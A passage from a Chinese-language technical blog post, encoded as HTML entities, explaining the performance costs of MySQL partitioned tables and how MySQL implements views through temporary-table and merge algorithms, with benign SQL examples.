&#x5F20;&#x8868;&#xFF0C;&#x5E76;&#x4E14;&#x5173;&#x8054;&#x4F7F;&#x7528;&#x7684;&#x7D22;&#x5F15;&#x4E0E;&#x5206;&#x533A;&#x6761;&#x4EF6;&#x5E76;&#x4E0D;&#x5339;&#x914D;&#xFF0C;&#x90A3;&#x4E48;&#x5173;&#x8054;&#x65F6;&#x5BF9;&#x7B2C;&#x4E00;&#x5F20;&#x8868;&#x4E2D;&#x7B26;&#x5408;&#x6761;&#x4EF6;&#x7684;&#x6BCF;&#x4E00;&#x884C;&#x90FD;&#x9700;&#x8981;&#x8BBF;&#x95EE;&#x5E76;&#x641C;&#x7D22;&#x7B2C;&#x4E8C;&#x5F20;&#x8868;&#x7684;&#x6240;&#x6709;&#x5206;&#x533A;&#xFF08;&#x5173;&#x8054;&#x67E5;&#x8BE2;&#x539F;&#x7406;&#xFF0C;&#x8BF7;&#x53C2;&#x8003;&#x524D;&#x4E00;&#x7BC7;&#x6587;&#x7AE0;&#xFF09;</p><p><strong>3&#x3001;&#x9009;&#x62E9;&#x5206;&#x533A;&#x7684;&#x6210;&#x672C;&#x53EF;&#x80FD;&#x5F88;&#x9AD8;</strong></p><p>&#x5206;&#x533A;&#x6709;&#x5F88;&#x591A;&#x79CD;&#x7C7B;&#x578B;&#xFF0C;&#x4E0D;&#x540C;&#x7C7B;&#x578B;&#x7684;&#x5206;&#x533A;&#x5B9E;&#x73B0;&#x65B9;&#x5F0F;&#x4E5F;&#x4E0D;&#x540C;&#xFF0C;&#x6240;&#x4EE5;&#x5B83;&#x4EEC;&#x7684;&#x6027;&#x80FD;&#x4E5F;&#x4E0D;&#x5C3D;&#x76F8;&#x540C;&#xFF0C;&#x5C24;&#x5176;&#x662F;&#x8303;&#x56F4;&#x5206;&#x533A;&#xFF0C;&#x5728;&#x786E;&#x8BA4;&#x8FD9;&#x4E00;&#x884C;&#x5C5E;&#x4E8E;&#x54EA;&#x4E2A;&#x5206;&#x533A;&#x65F6;&#x4F1A;&#x626B;&#x63CF;&#x6240;&#x6709;&#x7684;&#x5206;&#x533A;&#x5B9A;&#x4E49;&#xFF0C;&#x8FD9;&#x6837;&#x7684;&#x7EBF;&#x6027;&#x626B;&#x63CF;&#x6548;&#x7387;&#x5E76;&#x4E0D;&#x9AD8;&#xFF0C;&#x6240;&#x4EE5;&#x968F;&#x7740;&#x5206;&#x533A;&#x6570;&#x7684;&#x589E;&#x957F;&#xFF0C;&#x6210;&#x672C;&#x4F1A;&#x8D8A;&#x6765;&#x8D8A;&#x9AD8;&#x3002;&#x7279;&#x522B;&#x662F;&#x5728;&#x6279;&#x91CF;&#x63D2;&#x5165;&#x6570;&#x636E;&#x65F6;&#xFF0C;&#x7531;&#x4E8E;&#x6BCF;&#x6761;&#x8BB0;&#x5F55;&#x5728;&#x63D2;&#x5165;&#x524D;&#xFF0C;&#x90FD;&#x9700;&#x8981;&#x786E;&#x8BA4;&#x5176;&#x5C5E;&#x4E8E;&#x54EA;&#x4E00;&#x4E2A;&#x5206;&#x533A;&#xFF0C;&#x5982;&#x679C;&#x5206;&#x533A;&#x6570;&#x592A;&#x5927;&#xFF0C;&#x4F1A;&#x9020;&#x6210;&#x63D2;&#x5165;&#x6027;&#x80FD;&#x7684;&#x6025;&#x5267;&#x4E0B;&#x964D;&#x3002;&#x56E0;&#x6B64;&#x6709;&#x5FC5;&#x8981;&#x9650;&#x5236;&#x5206;&#x533A;&#x6570;&#x91CF;&#xFF0C;&#x4F46;&#x4E5F;&#x4E0D;&#x7528;&#x592A;&#x8FC7;&#x62C5;&#x5FC3;&#xFF0C;&#x5BF9;&#x4E8E;&#x5927;&#x591A;&#x6570;&#x7CFB;&#x7EDF;&#xFF0C;100 &#x4E2A;&#x5DE6;&#x53F3;&#x7684;&#x5206;&#x533A;&#x662F;&#x6CA1;&#x6709;&#x95EE;&#x9898;&#x7684;&#x3002;</p><p><strong>4&#x3001;&#x6253;&#x5F00;&#x5E76;&#x9501;&#x4F4F;&#x6240;&#x6709;&#x5E95;&#x5C42;&#x8868;&#x7684;&#x6210;&#x672C;&#x5728;&#x67D0;&#x4E9B;&#x65F6;&#x5019;&#x4F1A;&#x5F88;&#x9AD8;</strong></p><p>&#x524D;&#x9762;&#x8BF4;&#x8FC7;&#xFF0C;&#x6253;&#x5F00;&#x5E76;&#x9501;&#x4F4F;&#x6240;&#x6709;&#x5E95;&#x5C42;&#x8868;&#x5E76;&#x4E0D;&#x4F1A;&#x5BF9;&#x6027;&#x80FD;&#x6709;&#x592A;&#x5927;&#x7684;&#x5F71;&#x54CD;&#xFF0C;&#x4F46;&#x5728;&#x67D0;&#x4E9B;&#x60C5;&#x51B5;&#x4E0B;&#xFF0C;&#x6BD4;&#x5982;&#x53EA;&#x9700;&#x8981;&#x67E5;&#x8BE2;&#x4E3B;&#x952E;&#xFF0C;&#x90A3;&#x4E48;&#x9501;&#x4F4F;&#x7684;&#x6210;&#x672C;&#x76F8;&#x5BF9;&#x4E8E;&#x4E3B;&#x952E;&#x7684;&#x67E5;&#x8BE2;&#x6765;&#x8BF4;&#xFF0C;&#x6210;&#x672C;&#x5C31;&#x7565;&#x9AD8;&#x3002;</p><p><strong>5&#x3001;&#x7EF4;&#x62A4;&#x5206;&#x533A;&#x7684;&#x6210;&#x672C;&#x53EF;&#x80FD;&#x4F1A;&#x5F88;&#x9AD8;</strong></p><p>&#x65B0;&#x589E;&#x548C;&#x5220;&#x9664;&#x5206;&#x533A;&#x7684;&#x901F;&#x5EA6;&#x90FD;&#x5F88;&#x5FEB;&#xFF0C;&#x4F46;&#x662F;&#x4FEE;&#x6539;&#x5206;&#x533A;&#x4F1A;&#x9020;&#x6210;&#x6570;&#x636E;&#x7684;&#x590D;&#x5236;&#xFF0C;&#x8FD9;&#x4E0E;ALTER TABLE&#x7684;&#x539F;&#x7406;&#x7C7B;&#x4F3C;&#xFF0C;&#x9700;&#x8981;&#x5148;&#x521B;&#x5EFA;&#x4E00;&#x4E2A;&#x5386;&#x53F2;&#x5206;&#x533A;&#xFF0C;&#x7136;&#x540E;&#x5C06;&#x6570;&#x636E;&#x590D;&#x5236;&#x5230;&#x5176;&#x4E2D;&#xFF0C;&#x6700;&#x540E;&#x5220;&#x9664;&#x539F;&#x5206;&#x533A;&#x3002;&#x56E0;&#x6B64;&#xFF0C;&#x8BBE;&#x8BA1;&#x6570;&#x636E;&#x5E93;&#x65F6;&#xFF0C;&#x8003;&#x8651;&#x4E1A;&#x52A1;&#x7684;&#x589E;&#x957F;&#x9700;&#x8981;&#xFF0C;&#x5408;&#x7406;&#x7684;&#x521B;&#x5EFA;&#x5206;&#x533A;&#x8868;&#x662F;&#x4E00;&#x4E2A;&#x975E;&#x5E38;&#x597D;&#x7684;&#x4E60;&#x60EF;&#x3002;&#x5728; MySQL5.6 &#x4EE5;&#x540E;&#x7684;&#x7248;&#x672C;&#x53EF;&#x4EE5;&#x4F7F;&#x7528;ALTER TABLE EXCHAGE PARTITION&#x8BED;&#x53E5;&#x6765;&#x4FEE;&#x6539;&#x5206;&#x533A;&#xFF0C;&#x5176;&#x6027;&#x80FD;&#x4F1A;&#x6709;&#x5F88;&#x5927;&#x63D0;&#x5347;&#x3002;</p><p>&#x5206;&#x533A;&#x8868;&#x8FD8;&#x6709;&#x4E00;&#x4E9B;&#x5176;&#x4ED6;&#x9650;&#x5236;&#xFF0C;&#x6BD4;&#x5982;&#x6240;&#x6709;&#x7684;&#x5E95;&#x5C42;&#x8868;&#x5FC5;&#x987B;&#x4F7F;&#x7528;&#x76F8;&#x540C;&#x7684;&#x5B58;&#x50A8;&#x5F15;&#x64CE;&#xFF0C;&#x67D0;&#x4E9B;&#x5B58;&#x50A8;&#x5F15;&#x64CE;&#x4E5F;&#x4E0D;&#x652F;&#x6301;&#x5206;&#x533A;&#x3002;&#x5206;&#x533A;&#x4E00;&#x822C;&#x5E94;&#x7528;&#x4E8E;&#x4E00;&#x53F0;&#x670D;&#x52A1;&#x5668;&#x4E0A;&#xFF0C;&#x4F46;&#x4E00;&#x53F0;&#x670D;&#x52A1;&#x5668;&#x7684;&#x7269;&#x7406;&#x8D44;&#x6E90;&#x603B;&#x662F;&#x6709;&#x9650;&#x7684;&#xFF0C;&#x5F53;&#x6570;&#x636E;&#x8FBE;&#x5230;&#x8FD9;&#x4E2A;&#x6781;&#x9650;&#x65F6;&#xFF0C;&#x5373;&#x4F7F;&#x5206;&#x533A;&#xFF0C;&#x6027;&#x80FD;&#x4E5F;&#x53EF;&#x80FD;&#x4F1A;&#x5F88;&#x4F4E;&#xFF0C;&#x6240;&#x4EE5;&#x8FD9;&#x4E2A;&#x65F6;&#x5019;&#x5206;&#x5E93;&#x662F;&#x5FC5;&#x987B;&#x7684;&#x3002;&#x4F46;&#x4E0D;&#x7BA1;&#x662F;&#x5206;&#x533A;&#x3001;&#x5206;&#x5E93;&#x8FD8;&#x662F;&#x5206;&#x8868;&#xFF0C;&#x5B83;&#x4EEC;&#x7684;&#x601D;&#x60F3;&#x90FD;&#x662F;&#x4E00;&#x6837;&#x7684;&#xFF0C;&#x5927;&#x5BB6;&#x53EF;&#x4EE5;&#x597D;&#x597D;&#x4F53;&#x4F1A;&#x4E0B;&#x3002;</p><h4 id="&#x89C6;&#x56FE;"><a href="#&#x89C6;&#x56FE;" class="headerlink" title="&#x89C6;&#x56FE;"></a>&#x89C6;&#x56FE;</h4><p>&#x5BF9;&#x4E8E;&#x4E00;&#x4E9B;&#x5173;&#x8054;&#x8868;&#x7684;&#x590D;&#x6742;&#x67E5;&#x8BE2;&#xFF0C;&#x4F7F;&#x7528;&#x89C6;&#x56FE;&#x6709;&#x65F6;&#x5019;&#x4F1A;&#x5927;&#x5927;&#x7B80;&#x5316;&#x95EE;&#x9898;&#xFF0C;&#x56E0;&#x6B64;&#x5728;&#x8BB8;&#x591A;&#x573A;&#x5408;&#x4E0B;&#x90FD;&#x53EF;&#x4EE5;&#x770B;&#x5230;&#x89C6;&#x56FE;&#x7684;&#x8EAB;&#x5F71;&#xFF0C;&#x4F46;&#x89C6;&#x56FE;&#x771F;&#x5982;&#x6211;&#x4EEC;&#x6240;&#x60F3;&#x90A3;&#x6837;&#x7B80;&#x5355;&#x5417;&#xFF1F;&#x5B83;&#x548C;&#x76F4;&#x63A5;&#x4F7F;&#x7528;JOIN&#x7684; SQL &#x8BED;&#x53E5;&#x6709;&#x4F55;&#x533A;&#x522B;&#xFF1F;&#x89C6;&#x56FE;&#x80CC;&#x540E;&#x7684;&#x539F;&#x7406;&#x53C8;&#x4E86;&#x89E3;&#x591A;&#x5C11;&#xFF1F;</p><p>&#x89C6;&#x56FE;&#x672C;&#x8EAB;&#x662F;&#x4E00;&#x4E2A;&#x865A;&#x62DF;&#x8868;&#xFF0C;&#x4E0D;&#x5B58;&#x653E;&#x4EFB;&#x4F55;&#x6570;&#x636E;&#xFF0C;&#x67E5;&#x8BE2;&#x89C6;&#x56FE;&#x7684;&#x6570;&#x636E;&#x96C6;&#x7531;&#x5176;&#x4ED6;&#x8868;&#x751F;&#x6210;&#x3002;MySQL &#x5E95;&#x5C42;&#x901A;&#x8FC7;&#x4E24;&#x79CD;&#x7B97;&#x6CD5;&#x6765;&#x5B9E;&#x73B0;&#x89C6;&#x56FE;&#xFF1A;&#x4E34;&#x65F6;&#x8868;&#x7B97;&#x6CD5;&#xFF08;TEMPTABLE&#xFF09;&#x548C;&#x5408;&#x5E76;&#x7B97;&#x6CD5;&#xFF08;MERGE&#xFF09;&#x3002;&#x6240;&#x8C13;&#x4E34;&#x65F6;&#x8868;&#x7B97;&#x6CD5;&#x5C31;&#x662F;&#x5C06; SELECT &#x8BED;&#x53E5;&#x7684;&#x7ED3;&#x679C;&#x5B58;&#x653E;&#x5230;&#x4E34;&#x65F6;&#x8868;&#x4E2D;&#xFF0C;&#x5F53;&#x9700;&#x8981;&#x8BBF;&#x95EE;&#x89C6;&#x56FE;&#x7684;&#x65F6;&#x5019;&#xFF0C;&#x76F4;&#x63A5;&#x8BBF;&#x95EE;&#x8FD9;&#x4E2A;&#x4E34;&#x65F6;&#x8868;&#x5373;&#x53EF;&#x3002;&#x800C;&#x5408;&#x5E76;&#x7B97;&#x6CD5;&#x5219;&#x662F;&#x91CD;&#x5199;&#x5305;&#x542B;&#x89C6;&#x56FE;&#x7684;&#x67E5;&#x8BE2;&#xFF0C;&#x5C06;&#x89C6;&#x56FE;&#x5B9A;&#x4E49;&#x7684; SQL &#x76F4;&#x63A5;&#x5305;&#x542B;&#x8FDB;&#x67E5;&#x8BE2; SQL &#x4E2D;&#x3002;&#x901A;&#x8FC7;&#x4E24;&#x4E2A;&#x7B80;&#x5355;&#x7684;&#x793A;&#x4F8B;&#x6765;&#x4F53;&#x4F1A;&#x4E24;&#x4E2A;&#x7B97;&#x6CD5;&#x7684;&#x5DEE;&#x5F02;&#xFF0C;&#x521B;&#x5EFA;&#x5982;&#x4E0B;&#x89C6;&#x56FE;&#xFF1A;<br></p><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">-- &#x89C6;&#x56FE;&#x7684;&#x4F5C;&#x7528;&#x662F;&#x67E5;&#x8BE2;&#x672A;&#x652F;&#x4ED8;&#x8BA2;&#x5355;</span><br><span class="line">CREATE VIEW unpay_order AS</span><br><span class="line">SELECT * FROM sales WHERE status = <span class="string">&apos;new&apos;</span></span><br><span class="line">WITH CHECK OPTION;   -- &#x5176;&#x4F5C;&#x7528;&#x4E0B;&#x6587;&#x4F1A;&#x8BB2;</span><br></pre></td></tr></tbody></table></figure><p></p><p>&#x73B0;&#x8981;&#x4ECE;&#x672A;&#x652F;&#x4ED8;&#x8BA2;&#x5355;&#x4E2D;&#x67E5;&#x8BE2;&#x8D2D;&#x4E70;&#x8005;&#x4E3A;csc&#x7684;&#x8BA2;&#x5355;&#xFF0C;&#x53EF;&#x4EE5;&#x4F7F;&#x7528;&#x5982;&#x4E0B;&#x67E5;&#x8BE2;&#xFF1A;<br></p><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">-- &#x67E5;&#x8BE2;&#x8D2D;&#x4E70;&#x8005;&#x4E3A;csc&#x4E14;&#x672A;&#x652F;&#x4ED8;&#x7684;&#x8BA2;&#x5355;</span><br><span class="line">SELECT order_id,order_amount,buyer FROM unpay_order WHERE buyer = <span class="string">&apos;csc&apos;</span>;</span><br></pre></td></tr></tbody></table></figure><p></p><p>&#x4F7F;&#x7528;&#x4E34;&#x65F6;&#x8868;&#x6765;&#x6A21;&#x62DF;&#x89C6;&#x56FE;&#xFF1A;<br></p><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">CREATE TEMPORARY TABLE tmp_order_unpay AS SELECT * FROM sales WHERE status = <span class="string">&apos;new&apos;</span>;</span><br><span class="line">SELECT order_id,order_amount,buyer FROM tmp_order_unpay WHERE buyer = <span class="string">&apos;csc&apos;</span>;</span><br></pre></td></tr></tbody></table></figure><p></p><p>&#x4F7F;&#x7528;&#x5408;&#x5E76;&#x7B97;&#x6CD5;&#x5C06;&#x89C6;&#x56FE;&#x5B9A;&#x4E49;&#x7684; SQL &#x5408;&#x5E76;&#x8FDB;&#x67E5;&#x8BE2; SQL &#x540E;&#x7684;&#x6837;&#x5B50;&#xFF1A;<br></p><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT order_id,order_amount,buyer FROM sales WHERE status = <span class="string">&apos;new&apos;</span> AND buyer = <span class="string">&apos;csc&apos;</span>;</span><br></pre></td></tr></tbody></table></figure><p></p><p>MySQL &#x53EF;&#x4EE5;&#x5D4C;&#x5957;&#x5B9A;&#x4E49;&#x89C6;&#x56FE;&#xFF0C;&#x5373;&#x5728;&#x4E00;&#x4E2A;&#x89C6;&#x56FE;&#x4E0A;&#x5728;&#x5B9A;&#x4E49;&#x53E6;&#x4E00;&#x4E2A;&#x89C6;&#x56FE;&#xFF0C;&#x53EF;&#x4EE5;&#x5728;EXPLAIN EXTENDED&#x4E4B;&#x540E;&#x4F7F;&#x7528;SHOW WARNINGS&#x6765;&#x67E5;&#x770B;&#x4F7F;&#x7528;&#x89C6;&#x56FE;&#x7684;&#x67E5;&#x8BE2;&#x91CD;&#x5199;&#x540E;&#x7684;&#x7ED3;&#x679C;&#x3002;&#x5982;&#x679C;&#x91C7;&#x7528;&#x4E34;&#x65F6;&#x8868;&#x7B97;&#x6CD5;&#x5B9E;&#x73B0;&#x7684;&#x89C6;&#x56FE;&#xFF0C;EXPLAIN&#x4E2D;&#x4F1A;&#x663E;&#x793A;&#x4E3A;&#x6D3E;&#x751F;&#x8868;&#xFF08;DERIVED&#xFF09;&#xFF0C;&#x6CE8;&#x610F;EXPLAIN&#x65F6;&#x9700;&#x8981;&#x5B9E;&#x9645;&#x6267;&#x884C;&#x5E76;&#x4EA7;&#x751F;&#x4E34;&#x65F6;&#x8868;&#xFF0C;&#x6240;&#x4EE5;&#x6709;&#x53EF;&#x80FD;&#x4F1A;&#x5F88;&#x6162;&#x3002;</p><p>&#x660E;&#x663E;&#x5730;&#xFF0C;&#x4E34;&#x65F6;&#x8868;&#x4E0A;&#x6CA1;&#x6709;&#x4EFB;&#x4F55;&#x7D22;&#x5F15;&#xFF0C;&#x800C;&#x4E14;&#x4F18;&#x5316;&#x5668;&#x4E5F;&#x5F88;&#x96BE;&#x4F18;&#x5316;&#x4E34;&#x65F6;&#x8868;&#x4E0A;&#x7684;&#x67E5;&#x8BE2;&#xFF0C;&#x56E0;&#x6B64;&#xFF0C;&#x5982;&#x6709;&#x53EF;&#x80FD;&#xFF0C;&#x5C3D;&#x91CF;&#x4F7F;&#x7528;&#x5408;&#x5E76;&#x7B97;&#x6CD5;&#x4F1A;&#x6709;&#x66F4;&#x597D;&#x7684;&#x6027;&#x80FD;&#x3002;&#x90A3;&#x4E48;&#x95EE;&#x9898;&#x6765;&#x4E86;&#xFF1A;&#x5408;&#x5E76;&#x7B97;&#x6CD5;&#xFF08;&#x7C7B;&#x4F3C;&#x4E8E;&#x76F4;&#x63A5;&#x67E5;&#x8BE2;&#xFF09;&#x6709;&#x66F4;&#x597D;&#x7684;&#x6027;&#x80FD;&#xFF0C;&#x4E3A;&#x4EC0;&#x4E48;&#x8FD8;&#x8981;&#x4F7F;&#x7528;&#x89C6;&#x56FE;&#xFF1F;</p><p>&#x9996;&#x5148;&#x89C6;&#x56FE;&#x53EF;&#x4EE5;&#x7B80;&#x5316;&#x5E94;&#x7528;&#x4E0A;&#x5C42;&#x7684;&#x64CD;&#x4F5C;&#xFF0C;&#x8BA9;&#x5E94;&#x7528;&#x66F4;&#x4E13;&#x6CE8;&#x4E8E;&#x5176;&#x6240;&#x5173;&#x5FC3;&#x7684;&#x6570;&#x636E;&#x3002;&#x5176;&#x6B21;&#xFF0C;&#x89C6;&#x56FE;&#x80FD;&#x591F;&#x5BF9;&#x654F;&#x611F;&#x6570;&#x636E;&#x63D0;&#x4F9B;&#x5B89;&#x5168;&#x4FDD;&#x62A4;&#xFF0C;&#x6BD4;&#x5982;&#xFF1A;&#x5BF9;&#x4E0D;&#x540C;&#x7684;&#x7528;&#x6237;&#x5B9A;&#x4E49;&#x4E0D;&#x540C;&#x7684;&#x89C6;&#x56FE;&#xFF0C;&#x53EF;&#x4EE5;&#x4F7F;&#x654F;&#x611F;&#x6570;&#x636E;&#x4E0D;&#x51FA;&#x73B0;&#x5728;&#x4E0D;&#x5E94;&#x8BE5;&#x770B;&#x5230;&#x8FD9;&#x4E9B;&#x6570;&#x636E;&#x7684;&#x7528;&#x6237;&#x89C6;&#x56FE;&#x4E0A;&#xFF1B;&#x4E5F;&#x53EF;&#x4EE5;&#x4F7F;&#x7528;&#x89C6;&#x56FE;&#x5B9E;&#x73B0;&#x57FA;&#x4E8E;&#x5217;&#x7684;&#x6743;&#x9650;&#x63A7;&#x5236;&#xFF0C;&#x800C;&#x4E0D;&#x9700;&#x8981;&#x771F;&#x6B63;&#x7684;&#x5728;&#x6570;&#x636E;&#x5E93;&#x4E2D;&#x521B;&#x5EFA;&#x5217;&#x6743;&#x9650;&#x3002;&#x518D;&#x8005;&#xFF0C;&#x89C6;&#x56FE;&#x53EF;&#x4EE5;&#x65B9;&#x4FBF;&#x7CFB;&#x7EDF;&#x8FD0;&#x7EF4;&#xFF0C;&#x6BD4;&#x5982;&#xFF1A;&#x5728;&#x91CD;&#x6784; schema &#x7684;&#x65F6;&#x5019;&#x4F7F;&#x7528;&#x89C6;&#x56FE;&#xFF0C;&#x4F7F;&#x5F97;&#x5728;&#x4FEE;&#x6539;&#x89C6;&#x56FE;&#x5E95;&#x5C42;&#x8868;&#x7ED3;&#x6784;&#x7684;&#x65F6;&#x5019;&#xFF0C;&#x5E94;&#x7528;&#x4EE3;&#x7801;&#x8FD8;&#x53EF;&#x4EE5;&#x7EE7;&#x7EED;&#x8FD0;&#x884C;&#x4E0D;&#x62A5;&#x9519;&#x3002;</p><p>&#x57FA;&#x4E8E;&#x6B64;&#xFF0C;&#x4F7F;&#x7528;&#x89C6;&#x56FE;&#x5176;&#x5B9E;&#x66F4;&#x591A;&#x7684;&#x662F;&#x57FA;&#x4E8E;&#x4E1A;&#x52A1;&#x6216;&#x8005;&#x7EF4;&#x62A4;&#x6210;&#x672C;&#x4E0A;&#x7684;&#x8003;&#x8651;&#xFF0C;&#x5176;&#x672C;&#x8EAB;&#x5E76;&#x4E0D;&#x4F1A;&#x5BF9;&#x6027;&#x80FD;&#x63D0;&#x5347;&#x6709;&#x591A;&#x5927;&#x4F5C;&#x7528;&#xFF08;&#x6CE8;&#x610F;&#xFF1A;&#x6B64;&#x5904;&#x53EA;&#x662F;&#x57FA;&#x4E8E; MySQL &#x8003;&#x8651;&#xFF0C;&#x5176;&#x4ED6;&#x5173;&#x7CFB;&#x6027;&#x6570;&#x636E;&#x5E93;&#x4E2D;&#x89C6;&#x56FE;&#x53EF;&#x80FD;&#x4F1A;&#x6709;&#x66F4;&#x597D;&#x7684;&#x6027;&#x80FD;&#xFF0C;&#x6BD4;&#x5982;ORACLE&#x548C;MS SQL SERVER&#x90FD;&#x652F;&#x6301;&#x7269;&#x5316;&#x89C6;&#x56FE;&#xFF0C;&#x5B83;&#x4EEC;&#x90FD;&#x6BD4; MySQL &#x89C6;&#x56FE;&#x6709;&#x66F4;&#x597D;&#x7684;&#x6027;&#x80FD;&#xFF09;&#x3002;&#x800C;&#x4E14;&#x4F7F;&#x7528;&#x4E34;&#x65F6;&#x8868;&#x7B97;&#x6CD5;&#x5B9E;&#x73B0;&#x7684;&#x89C6;&#x56FE;&#xFF0C;&#x5728;&#x67D0;&#x4E9B;&#x65F6;&#x5019;&#x6027;&#x80FD;&#x53EF;&#x80FD;&#x4F1A;&#x975E;&#x5E38;&#x7CDF;&#x7CD5;&#xFF0C;&#x6BD4;&#x5982;&#xFF1A;<br></p><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">-- &#x89C6;&#x56FE;&#x7684;&#x4F5C;&#x7528;&#x662F;&#x7EDF;&#x8BA1;&#x6BCF;&#x65E5;&#x652F;&#x51FA;&#x91D1;&#x989D;&#xFF0C;DATE(<span class="string">&apos;2017-06-15 12:00:23&apos;</span>) = 2017-06-15</span><br><span class="line">CREATE VIEW cost_per_day AS</span><br><span class="line">SELECT DATE(create_time) AS date,SUM(cost) AS cost FROM costs GROUP BY date;</span><br></pre></td></tr></tbody></table></figure><p></p><p>&#x73B0;&#x8981;&#x7EDF;&#x8BA1;&#x6BCF;&#x65E5;&#x7684;&#x6536;&#x5165;&#x4E0E;&#x652F;&#x51FA;&#xFF0C;&#x6709;&#x7C7B;&#x4F3C;&#x4E8E;&#x4E0A;&#x9762;&#x7684;&#x6536;&#x5165;&#x8868;&#xFF0C;&#x53EF;&#x4EE5;&#x4F7F;&#x7528;&#x5982;&#x4E0B; SQL&#xFF1A;<br></p><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">SELECT c.date,c.cost,s.amount</span><br><span class="line">FROM cost_per_day AS c</span><br><span class="line">JOIN sale_per_day AS s USING(date)</span><br><span class="line">WHERE date BETWEEN <span class="string">&apos;2017-06-01&apos;</span> AND <span class="string">&apos;2017-06-30&apos;</span></span><br></pre></td></tr></tbody></table></figure><p></p><p>&#x8FD9;&#x4E2A;&#x67E5;&#x8BE2;&#x4E2D;&#xFF0C;MySQL &#x5148;&#x6267;&#x884C;&#x89C6;&#x56FE;&#x7684; SQL&#xFF0C;&#x751F;&#x6210;&#x4E34;&#x65F6;&#x8868;&#xFF0C;&#x7136;&#x540E;&#x518D;&#x5C06;sale_per_day&#x8868;&#x548C;&#x4E34;&#x65F6;&#x8868;&#x8FDB;&#x884C;&#x5173;&#x8054;&#x3002;&#x8FD9;&#x91CC;WHERE&#x5B57;&#x53E5;&#x4E2D;&#x7684;BETWEEN&#x6761;&#x4EF6;&#x5E76;&#x4E0D;&#x80FD;&#x4E0B;&#x63A8;&#x5230;&#x89C6;&#x56FE;&#x4E2D;&#xFF0C;&#x56E0;&#x800C;&#x89C6;&#x56FE;&#x5728;&#x521B;&#x5EFA;&#x65F6;&#xFF0C;&#x4F1A;&#x5C06;&#x6240;&#x6709;&#x7684;&#x6570;&#x636E;&#x653E;&#x5230;&#x4E34;&#x65F6;&#x8868;&#x4E2D;&#xFF0C;&#x800C;&#x4E0D;&#x662F;&#x4E00;&#x4E2A;&#x6708;&#x6570;&#x636E;&#xFF0C;&#x5E76;&#x4E14;&#x8FD9;&#x4E2A;&#x4E34;&#x65F6;&#x8868;&#x4E5F;&#x4E0D;&#x4F1A;&#x6709;&#x7D22;&#x5F15;&#x3002;</p><p>&#x5F53;&#x7136;&#x8FD9;&#x4E2A;&#x793A;&#x4F8B;&#x4E2D;&#x7684;&#x4E34;&#x65F6;&#x8868;&#x6570;&#x636E;&#x4E0D;&#x4F1A;&#x592A;&#x5927;&#xFF0C;&#x6BD5;&#x7ADF;&#x65E5;&#x671F;&#x7684;&#x6570;&#x91CF;&#x4E0D;&#x4F1A;&#x592A;&#x591A;&#xFF0C;&#x4F46;&#x4ECD;&#x7136;&#x8981;&#x8003;&#x8651;&#x751F;&#x6210;&#x4E34;&#x65F6;&#x8868;&#x7684;&#x6027;&#x80FD;&#xFF08;&#x5982;&#x679C; costs &#x8868;&#x6570;&#x636E;&#x8FC7;&#x5927;&#xFF0C;GROUP BY&#x6709;&#x53EF;&#x80FD;&#x4F1A;&#x6BD4;&#x8F83;&#x6162;&#xFF09;&#x3002;&#x800C;&#x4E14;&#x672C;&#x793A;&#x4F8B;&#x4E2D;&#x7D22;&#x5F15;&#x4E5F;&#x4E0D;&#x662F;&#x95EE;&#x9898;&#xFF0C;&#x901A;&#x8FC7;&#x4E0A;&#x4E00;&#x7BC7;&#x6211;&#x4EEC;&#x77E5;&#x9053;&#xFF0C;&#x5982;&#x679C; MySQL &#x5C06;&#x4E34;&#x65F6;&#x8868;&#x4F5C;&#x4E3A;&#x5173;&#x8054;&#x987A;&#x5E8F;&#x4E2D;&#x7684;&#x7B2C;&#x4E00;&#x5F20;&#x8868;&#xFF0C;&#x4ECD;&#x7136;&#x53EF;&#x4EE5;&#x4F7F;&#x7528;sale_per_day&#x4E2D;&#x7684;&#x7D22;&#x5F15;&#x3002;&#x4F46;&#x5982;&#x679C;&#x662F;&#x5BF9;&#x4E24;&#x4E2A;&#x89C6;&#x56FE;&#x505A;&#x5173;&#x8054;&#x7684;&#x8BDD;&#xFF0C;&#x4F18;&#x5316;&#x5668;&#x5C31;&#x6CA1;&#x6709;&#x4EFB;&#x4F55;&#x7D22;&#x5F15;&#x53EF;&#x4EE5;&#x4F7F;&#x7528;&#xFF0C;&#x8FD9;&#x65F6;&#x5C31;&#x9700;&#x8981;&#x4E25;&#x683C;&#x6D4B;&#x8BD5;&#x5E94;&#x7528;&#x7684;&#x6027;&#x80FD;&#x662F;&#x5426;&#x6EE1;&#x8DB3;&#x9700;&#x6C42;&#x3002;</p><p>&#x6211;&#x4EEC;&#x5F88;&#x5C11;&#x4F1A;&#x5728;&#x5B9E;&#x9645;&#x4E1A;&#x52A1;&#x573A;&#x666F;&#x4E2D;&#x53BB;&#x66F4;&#x65B0;&#x89C6;&#x56FE;&#xFF0C;&#x56E0;&#x6B64;&#x5370;&#x8C61;&#x4E2D;&#xFF0C;&#x89C6;&#x56FE;&#x662F;&#x4E0D;&#x80FD;&#x66F4;&#x65B0;&#x7684;&#x3002;&#x4F46;&#x5B9E;&#x9645;&#x4E0A;&#xFF0C;&#x5728;&#x67D0;&#x4E9B;&#x60C5;&#x51B5;&#x4E0B;&#xFF0C;&#x89C6;&#x56FE;&#x662F;&#x53EF;&#x4EE5;&#x66F4;&#x65B0;&#x7684;&#x3002;&#x53EF;&#x66F4;&#x65B0;&#x89C6;&#x56FE;&#x662F;&#x6307;&#x901A;&#x8FC7;&#x66F4;&#x65B0;&#x8FD9;&#x4E2A;&#x89C6;&#x56FE;&#x6765;&#x66F4;&#x65B0;&#x89C6;&#x56FE;&#x6D89;&#x53CA;&#x7684;&#x76F8;&#x5173;&#x8868;&#xFF0C;&#x53EA;&#x8981;&#x6307;&#x5B9A;&#x4E86;&#x5408